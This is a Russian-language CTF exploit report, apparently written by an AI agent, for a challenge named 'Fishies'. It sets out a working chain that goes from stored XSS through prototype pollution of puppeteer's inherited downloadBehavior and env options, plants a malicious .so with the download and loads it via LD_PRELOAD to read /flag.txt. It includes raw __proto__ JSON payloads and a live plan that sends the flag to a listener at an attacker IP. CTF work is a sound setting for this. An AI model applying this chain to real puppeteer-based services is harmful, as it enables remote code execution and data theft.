# Fishies seq14 → mt: `downloadBehavior` наследуется — это и есть «писатель файлов». Цепочка до /flag.txt доказана целиком

## Короткий ответ

1. **Твоя гипотеза верна: `downloadBehavior` читается из `options` по цепочке прототипов.** В `server.js` собственного `downloadBehavior` нет → загрязнённый `Object.prototype.downloadBehavior` подхватывается, доезжает до `Browser.setDownloadBehavior` и **реально меняет каталог, куда Chromium кладёт скачанный файл**. Проверено локально: файл появляется именно в `downloadPath`, а не в `$HOME/Downloads`.
2. Каталог, которого ещё нет, Chromium **создаёт сам** (проверено: `…/dl_new/sub` не существовал → после скачивания файл на месте).
3. Это закрывает последнюю нерешённую часть цепочки. Полная цепочка `XSS → admin PATCH → PP → downloadBehavior` (скачивание нашего `.so` в `/app/static/<dir>`) `→ PP env.LD_PRELOAD` → **чтение `/flag.txt`** отработана end-to-end на точной копии кода: конструктор `.so` прочитал файл и записал его содержимое. Ни Handlebars-гаджета, ни записи файлов средствами приложения не потребовалось.
4. Live по-прежнему недоступен из моей сети (нет маршрута до CTF-VPN: `curl` → `000`), поэтому всё ниже — локально на точной копии `server.js`/`index.html` + puppeteer-core 25.16.0 + chromium 136.

## 1. Исходники v25.16.0 (локально установленная версия)

- `src/node/BrowserLauncher.ts:143` — `downloadBehavior,` деструктурируется из `options` рядом с `env` и остальными опциями:
  ```ts
  const {
    dumpio = false, enableExtensions = false, extensionsEnabledInIncognito = [],
    env = process.env, handleSIGINT = true, ..., downloadBehavior, slowMo = 0,
    timeout = 30000, ...
  } = options;
  ```
- `src/node/BrowserLauncher.ts:311` — передаётся в `CdpBrowser._create(..., downloadBehavior, ...)`.
- `src/cdp/Browser.ts:198-205` — `_attach(downloadBehavior)`: `if (downloadBehavior) await this.#defaultContext.setDownloadBehavior(downloadBehavior);`
- `src/cdp/BrowserContext.ts:178-186`:
  ```ts
  public async setDownloadBehavior(downloadBehavior: DownloadBehavior): Promise<void> {
    await this.#connection.send('Browser.setDownloadBehavior', {
      behavior: downloadBehavior.policy,
      downloadPath: downloadBehavior.downloadPath,
      browserContextId: this.#id,
    });
  }
  ```
- Тип (`src/api/Browser.ts`): `downloadBehavior?: {policy: 'allow' | 'deny' | 'allowAndName'; downloadPath?: string}`.

Никакой проверки «своё/унаследованное» нет: важно лишь, что `options.downloadBehavior !== undefined`. В `visitFish` его нет → наследование проходит.

## 2. Динамические тесты (локальная копия, `puppeteer.launch` с опциями как в `visitFish`)

Стенд `/tmp/gigatool/pp-audit/dlbtest.mjs`, `dlb2.mjs`. Опции запуска — ровно как в приложении: `{headless:true, args:['--no-sandbox','--disable-setuid-sandbox'], timeout}`; `executablePath` задан только потому, что локально стоит `puppeteer-core` (в контейнере путь резолвит полный `puppeteer`). Скачивание триггерится со страницы (blob → `<a download>`), как это сделал бы XSS.

| тест | загрязнение прототипа | результат |
|---|---|---|
| D1 | только `env.HOME=…/dl1` | файл в `dl1/Downloads/` — как и ожидалось при управлении только HOME |
| D2 | `env.HOME` + `downloadBehavior={policy:'allow', downloadPath:…/dl2}` | файл **в `dl2/`** (не в `Downloads`) → наследование работает |
| D3 | `downloadBehavior` без `env` | файл **в `dl2/`** → `downloadBehavior` самодостаточен, `HOME` не нужен |
| D4 | `downloadPath=…/dl_new/sub` (каталог не существует) | каталог создан, файл `y.so` записан |

Имя файла при `policy:'allow'` — basename из URL (атрибут `download` для cross-origin игнорируется), т.е. путь предсказуем. `policy:'deny'` скачивание отменяет, `allowAndName` даёт GUID-имена (последнее я не проверял, для нас не нужно).

## 3. End-to-end на точной копии приложения

Стенд: `/tmp/gigatool/pp-audit/e2e-server.js` — дословная логика `escape()`/`combine()`/`checkFishData()`, шаблон — копия `templates/index.html`, бот как в `visitFish` (cookie админа, `goto /#fishN`, ожидание), порт 18080. Шаги `/tmp/gigatool/pp-audit/dlb-e2e.mjs`:

1. `POST /api/fish` с ascii, который после бага `escape()` даёт живой `<img src=x onerror="…click по <a download> на http://<наш-хост>/payload.so…">`.
2. `PATCH /api/admin/fish/1/fishData`, тело — **сырой JSON** (важно: литерал `{__proto__:…}` в JS не сериализуется, нужно `JSON.stringify(JSON.parse(...))`):
   ```json
   {"__proto__":{"downloadBehavior":{"policy":"allow","downloadPath":"/app/static/dl2"},
                 "env":{"HOME":"/app/static/dl2","PATH":"/usr/local/bin:/usr/bin:/bin"}}}
   ```
3. `POST /api/fish/1/report` → бот №1: XSS-страница качает `.so` прямо в `downloadPath`.
   Результат прогона: `files in downloadPath: ["payload.so"]` (15576 байт), и тот же файл отдаётся статикой: `GET /static/dl2/payload.so` → **200**.
4. `PATCH` с `{"__proto__":{"env":{"LD_PRELOAD":"/app/static/dl2/payload.so","PATH":…,"HOME":…}}}`.
5. `POST /api/fish/1/report` → бот №2: chromium грузит наш `.so`, конструктор исполняется от пользователя `node` и читает файл.
   Результат: `[LD_PRELOAD fired] PP{MASK}` — содержимое файла получено (в логе несколько срабатываний — по одному на каждый процесс chromium).

Итого цепочка полностью рабочая и не требует ни одного «серверного» RCE-гаджета:

`stored XSS (escape-баг) → admin PATCH → combine() PP → наследуемый downloadBehavior + env → скачивание .so в каталог, раздаваемый express → наследуемый env.LD_PRELOAD → конструктор .so читает /flag.txt`.

## 4. Почему это удобнее HOME-варианта

- Не зависит от того, существует ли `$HOME/Downloads` и какой `HOME` у `node`; путь задаётся явно и предсказуемо.
- Каталог создаётся автоматически (D4) — можно сразу целиться в `/app/static/<любой новый подкаталог>`.
- Записанный файл одновременно доступен по HTTP (`/static/<dir>/<name>`) — это бесплатный оракул: `GET` вернёт 200 и точный размер, значит запись удалась, ещё до шага с `LD_PRELOAD`.
- `env` нужен только чтобы добавить `LD_PRELOAD` (плюс `PATH`), а `HOME` можно не трогать вовсе (D3).

## 5. Ограничения проверок (честно)

1. Живой инстанс недоступен (нет VPN-маршрута), live-прогон не делал.
2. Локально chromium 136 и `puppeteer-core`, а не полный `puppeteer@25.16.0` (полный тянет загрузку браузера и в песочнице не встал). На наследование опций и на `Browser.setDownloadBehavior` это не влияет: код `BrowserLauncher`/`BrowserContext` тот же.
3. Права записи `node` в `/app/static` в контейнере не проверены (инстанс недоступен) — это единственный практический риск шага 3.
4. `allowAndName`/`deny` не тестировал: для цепочки достаточно `allow`.

## 6. Следующий шаг на live (когда подниму VPN)

1. PP → `downloadBehavior={policy:'allow', downloadPath:'/app/static/dl'}` + `env.PATH`.
2. `report` → XSS-скачивание `.so` → проверка `GET /static/dl/payload.so` (200 + размер).
3. PP → `env.LD_PRELOAD=/app/static/dl/payload.so` → `report` → флаг в ответе нашего листенера (канал наружу у бота уже подтверждён на <attacker-ip>).
4. Если `/app/static` не писабелен — тот же `downloadBehavior` с `downloadPath:'/tmp/dl'` и `LD_PRELOAD=/tmp/dl/<name>.so`.

Артефакты стенда: `/tmp/gigatool/pp-audit/` — `dlbtest.mjs`, `dlb2.mjs`, `dlb-e2e.mjs`, `e2e-server.js`, `pwnwrite.c`, `payload.so`. Секретов инфраструктуры в отчёте нет.
